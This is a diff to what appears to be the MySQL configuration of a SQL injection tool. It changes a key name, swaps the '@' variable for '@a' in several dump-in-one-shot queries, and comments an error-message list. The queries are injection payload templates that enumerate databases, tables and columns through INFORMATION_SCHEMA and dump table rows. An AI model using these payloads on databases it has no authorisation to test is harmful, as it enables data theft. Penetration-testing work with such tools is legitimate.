@@ -113,7 +113,7 @@ resource:
     field: trim(ifnull(`${field.value}`, 0x20))
     concat: ",0x7f,"
 
- zipped:
+ zip:
   database: |
    select concat(
        group_concat(
@@ -171,17 +171,17 @@ resource:
 
  dios:
   database: |
-   select concat(@:=0,(select count(*) from (
+   select concat(@a:=0,(select count(*) from (
        select concat(
            ${enclose_value_hex},
            cast(SCHEMA_NAME as char),
            '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
        ) a
        from INFORMATION_SCHEMA.schemata
-   )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')
+   )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
 
   table: |
-   select concat(@:=0,(select count(*) from (
+   select concat(@a:=0,(select count(*) from (
        select concat(
            ${enclose_value_hex},
            cast(TABLE_NAME as char),
@@ -189,10 +189,10 @@ resource:
        ) a
        from information_schema.tables
        where TABLE_SCHEMA = 0x${database.hex}
-   )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')
+   )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
 
   column: |
-   select concat(@:=0,(select count(*) from (
+   select concat(@a:=0,(select count(*) from (
        select concat(
            ${enclose_value_hex},
            cast(COLUMN_NAME as char),
@@ -201,18 +201,18 @@ resource:
        from information_schema.columns
        where TABLE_SCHEMA = 0x${database.hex}
        and TABLE_NAME = 0x${table.hex}
-   )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')
+   )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
 
   row:
    query: |
-          select concat(@:=0,(select count(*) from (
+          select concat(@a:=0,(select count(*) from (
               select concat(
                   ${enclose_value_hex},
                   cast(concat(${fields}) as char),
                   '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
               ) a
               from `${database}`.`${table}`
-          )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')
+          )x where @a :=concat(@a,a) ${limit}), @a, '${trail_sql}')
    fields:
     field: trim(ifnull(`${field.value}`, 0x20))
     concat: ",0x7f,"
@@ -263,7 +263,7 @@ strategy:
     - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.*' at line \\d+
     - You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '.*' at line \\d+
     - Unknown column '.*' in 'where clause'
-    
+    # Other
     - MySQL
     - MariaDB
    orderByErrorMessage:
